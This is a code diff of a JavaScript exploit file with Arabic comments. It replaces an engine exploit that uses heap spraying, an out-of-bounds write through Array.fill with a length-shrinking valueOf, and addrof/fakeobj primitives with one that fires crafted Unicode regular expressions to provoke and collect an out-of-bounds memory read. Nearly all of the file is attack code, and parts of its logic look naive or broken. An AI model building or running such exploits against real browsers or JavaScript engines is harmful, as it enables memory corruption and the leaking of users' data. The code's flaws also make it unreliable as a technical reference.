@@ -1,191 +1,171 @@
 import { log, sleep } from './module/utils.mjs';
 
-class MassOOBExploit {
+class RegExpOOBReadExploit {
     constructor() {
         this.marker = 0x42424242;
-        this.found = false;
     }
 
     async execute() {
-        await this.massOOBSpray();
-        return await this.findRealOverlap();
+        await this.setupMemory();
+        return await this.triggerOOBRead();
     }
 
-    async massOOBSpray() {
-        log("Starting massive OOB spraying...");
+    async setupMemory() {
+        // تحضير الذاكرة للكشف عن OOB-read
+        this.buffers = [];
+        this.strings = [];
         
-        for (let round = 0; round < 100; round++) {
-            log(`OOB round ${round}`);
-            
-            // كل جولة: spray ثم OOB-write
-            await this.sprayArrays(round);
-            await this.multipleOOBWrites(round);
-            await sleep(20);
-            
-            if (this.found) break;
+        // إنشاء ArrayBuffers مع markers
+        for (let i = 0; i < 100; i++) {
+            const buffer = new ArrayBuffer(0x1000);
+            const view = new Uint32Array(buffer);
+            view[0] = this.marker;
+            view[1] = i;
+            this.buffers.push(buffer);
         }
+        
+        // إنشاء strings مع non-BMP characters
+        for (let i = 0; i < 50; i++) {
+            const str = String.fromCodePoint(128512).repeat(10 + i);
+            this.strings.push(str);
+        }
+        
+        log("Memory setup complete");
     }
 
-    async sprayArrays(round) {
-        this.arrays = [];
+    async triggerOOBRead() {
+        log("Triggering RegExp OOB-read...");
         
-        // spray مصفوفات floats و objects معاً
-        for (let i = 0; i < 200; i++) {
-            // مجموعة floats
-            const floats = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7];
-            floats.original_length = floats.length;
-            floats.type = "float";
-            floats.id = `f_${round}_${i}`;
+        const testCases = [
+            // من الكود الأصلي
+            "/(?!(?=^a|()+()+x)(abc))/gmu",
+            "/(?!(?=^a|x)(abc))/gmu", 
+            "/(?!(?=^a|x)(abc))/mu",
             
-            // مجموعة objects  
-            const objects = [{a: 1}, {b: 2}, {c: 3}, {d: 4}, {e: 5}];
-            objects.original_length = objects.length;
-            objects.type = "obj";
-            objects.id = `o_${round}_${i}`;
+            // أنماط إضافية للتجريب
+            "/(?=^)/gmu",
+            "/(?=$)/gmu",
+            "/^/gmu",
+            "/$/gmu"
+        ];
+        
+        for (const pattern of testCases) {
+            log(`Testing pattern: ${pattern}`);
             
-            this.arrays.push(floats, objects);
-        }
-        
-        log(`Sprayed ${this.arrays.length} arrays`);
-    }
-
-    async multipleOOBWrites(round) {
-        // OOB-writes متعددة بأحجام مختلفة
-        const sizes = [50000, 100000, 200000, 500000];
-        
-        for (const size of sizes) {
-            await this.singleOOBWrite(size, round);
-            await sleep(5);
-        }
-    }
-
-    async singleOOBWrite(size, round) {
-        const v0 = [];
-        
-        // ملء المصفوفة بكائنات معقدة
-        for (let i = 0; i < size; i++) {
-            v0[i] = {
-                round: round,
-                index: i,
-                float_data: [i * 0.1, i * 0.2, i * 0.3],
-                obj_data: {x: i, y: i * 2},
-                buffer: new ArrayBuffer(32 + (i % 16))
-            };
-        }
-        
-        const v10 = {
-            oob_marker: this.marker,
-            round: round,
-            payload: new ArrayBuffer(64)
-        };
-        
-        let shrunk = false;
-        const o14 = {
-            valueOf: () => {
-                if (!shrunk) {
-                    // تقليصات مختلفة في كل مرة
-                    const shrink_to = [100, 500, 1000, 5000][round % 4];
-                    v0.length = shrink_to;
-                    shrunk = true;
-                    log(`Shrunk to ${shrink_to}`);
+            try {
+                const result = await this.testPattern(pattern);
+                if (result.crashed || result.unexpected) {
+                    log(`PATTERN CRASHED: ${pattern}`);
+                    return true;
                 }
-                return [0, 1, 2, 3, 4, 5][round % 6]; // startIndex مختلف
-            }
-        };
-        
-        try {
-            v0.fill(v10, o14);
-        } catch (e) {}
-        
-        // احتفظ بمرجع لمنع الـ GC
-        this[`v0_${round}_${size}`] = v0;
-    }
-
-    async findRealOverlap() {
-        log("Scanning for real memory overlap...");
-        
-        for (let i = 0; i < this.arrays.length; i++) {
-            const arr = this.arrays[i];
-            
-            if (arr.type === "float") {
-                // ابحث عن objects عبر OOB في float arrays
-                for (let j = arr.original_length; j < arr.original_length + 100; j++) {
-                    if (arr[j] !== undefined && typeof arr[j] === 'object') {
-                        if (arr[j].a !== undefined || arr[j].b !== undefined) {
-                            log(`FOUND! Float array has object at index ${j}`);
-                            this.float_arr = arr;
-                            this.obj_in_float = arr[j];
-                            this.obj_index = j;
-                            this.found = true;
-                            return true;
-                        }
-                    }
-                }
+            } catch (e) {
+                log(`Pattern error: ${pattern} - ${e}`);
             }
             
-            if (arr.type === "obj") {
-                // ابحث عن floats عبر OOB في object arrays
-                for (let j = arr.original_length; j < arr.original_length + 100; j++) {
-                    if (typeof arr[j] === 'number' && arr[j] > 1.0 && arr[j] < 10.0) {
-                        log(`FOUND! Object array has float at index ${j}: ${arr[j]}`);
-                        this.obj_arr = arr;
-                        this.float_in_obj = arr[j];
-                        this.float_index = j;
-                        this.found = true;
-                        return true;
-                    }
-                }
-            }
+            await sleep(10);
         }
         
         return false;
     }
 
-    // الـ primitives الحقيقية
-    addrof(obj) {
-        if (!this.obj_arr || !this.float_index) return null;
+    async testPattern(patternStr) {
+        const regex = new RegExp(patternStr.slice(1, -1));
+        const str = String.fromCodePoint(128512).repeat(20);
         
-        // ضع الكائن في object array
-        this.obj_arr[0] = obj;
+        let result;
+        let crashed = false;
+        let unexpected = false;
         
-        // اقرأ من float array في الموضع المتداخل
-        return this.float_arr[this.float_index];
+        try {
+            result = str.replace(regex, (match) => {
+                // إذا حدث OOB-read، قد نرى بيانات غير متوقعة
+                if (match.length > 1000) {
+                    unexpected = true;
+                    log(`SUSPICIOUS match length: ${match.length}`);
+                }
+                return '|';
+            });
+            
+            // تحقق من النتيجة
+            if (result.length !== str.length + 1) {
+                log(`UNEXPECTED result length: ${result.length}`);
+                unexpected = true;
+            }
+            
+        } catch (e) {
+            crashed = true;
+            log(`CRASH with pattern: ${e}`);
+        }
+        
+        return { crashed, unexpected, result };
     }
 
-    fakeobj(addr) {
-        if (!this.float_arr || !this.obj_index) return null;
+    // محاولة لاستغلال OOB-read للحصول على معلومات الذاكرة
+    async exploitMemoryLeak() {
+        log("Attempting memory leak via OOB-read...");
         
-        // اكتب العنوان في float array
-        this.float_arr[this.obj_index] = addr;
+        const leakedData = [];
         
-        // اقرأ من object array في الموضع المتداخل
-        return this.obj_arr[0];
+        for (let i = 0; i < 10; i++) {
+            const str = this.createSpeciallyCraftedString(i);
+            const regex = /(?!(?=^a|()+()+x)(abc))/gmu;
+            
+            try {
+                const result = str.replace(regex, (match, offset, fullStr) => {
+                    // إذا كان هناك OOB-read، قد نرى بيانات من الذاكرة المجاورة
+                    if (match.length > 2) {
+                        leakedData.push({
+                            iteration: i,
+                            match: match,
+                            length: match.length,
+                            offset: offset
+                        });
+                    }
+                    return '|';
+                });
+                
+                if (leakedData.length > 0) {
+                    log(`Found ${leakedData.length} potential leaks`);
+                    return leakedData;
+                }
+                
+            } catch (e) {
+                log(`Leak attempt ${i} crashed: ${e}`);
+            }
+            
+            await sleep(5);
+        }
+        
+        return null;
+    }
+
+    createSpeciallyCraftedString(iteration) {
+        // إنشاء string مصمم خصيصاً لاستغلال الثغرة
+        const base = String.fromCodePoint(128512 + iteration);
+        const padding = "A".repeat(iteration * 10);
+        return padding + base.repeat(15) + padding;
     }
 }
 
-// التشغيل
+// التشغيل الرئيسي
 async function main() {
-    const exploit = new MassOOBExploit();
-    const success = await exploit.execute();
+    const exploit = new RegExpOOBReadExploit();
     
-    if (success) {
-        log("SUCCESS: Real memory overlap found!");
+    log("Starting RegExp OOB-read exploit...");
+    
+    const triggered = await exploit.execute();
+    if (triggered) {
+        log("OOB-read likely triggered! Attempting exploitation...");
         
-        // اختبار الـ primitives
-        const testObj = {secret: 0x1337, data: "test"};
-        
-        log("Testing addrof...");
-        const addr = exploit.addrof(testObj);
-        log(`Address: ${addr} (type: ${typeof addr})`);
-        
-        if (addr && typeof addr === 'number' && addr > 1000) {
-            log("Testing fakeobj...");
-            const fake = exploit.fakeobj(addr);
-            log(`Fake object matches: ${fake === testObj}`);
+        const leaks = await exploit.exploitMemoryLeak();
+        if (leaks) {
+            log("Potential memory leaks found:");
+            for (const leak of leaks) {
+                log(`  Iteration ${leak.iteration}: length=${leak.length}, offset=${leak.offset}`);
+            }
         }
-        
     } else {
-        log("No overlap found -可能需要 جولات أكثر أو إعداد مختلف");
+        log("No OOB-read detected with standard patterns");
     }
 }
 
